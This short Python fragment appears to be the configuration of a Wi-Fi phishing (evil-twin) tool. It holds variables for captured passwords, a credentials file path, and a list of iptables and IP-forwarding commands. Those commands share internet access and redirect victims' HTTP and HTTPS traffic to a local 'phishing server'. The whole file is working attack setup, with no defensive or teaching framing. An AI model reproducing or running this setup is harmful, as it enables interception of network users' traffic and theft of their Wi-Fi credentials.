
PASSWORD_CAPTURED = False
CAPTURED_CREDENTIALS = {}
PHISHING_PORT = 80
FILENAME = "credentials/Wi-Fi_credentials.jsonl"
REDIRECT_URL = "http://192.168.1.1/"
CLIENT_CONNECTED = False
COMMANDS = [
    # Enable IP forwarding
    ["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"],
        
    # NAT rules for internet sharing
    ["iptables", "--flush"],
    ["iptables", "--table", "nat", "--flush"],
    ["iptables", "--delete-chain"],
    ["iptables", "--table", "nat", "--delete-chain"],
    ["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE"],
    ["iptables", "-A", "FORWARD", "-i", "wlan0", "-o", "eth0", "-j", "ACCEPT"],
    ["iptables", "-A", "FORWARD", "-i", "eth0", "-o", "wlan0", "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
    
    # Redirect HTTP traffic to your phishing server
    ["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "192.168.1.1:80"],
    ["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "443", "-j", "DNAT", "--to-destination", "192.168.1.1:443"]
]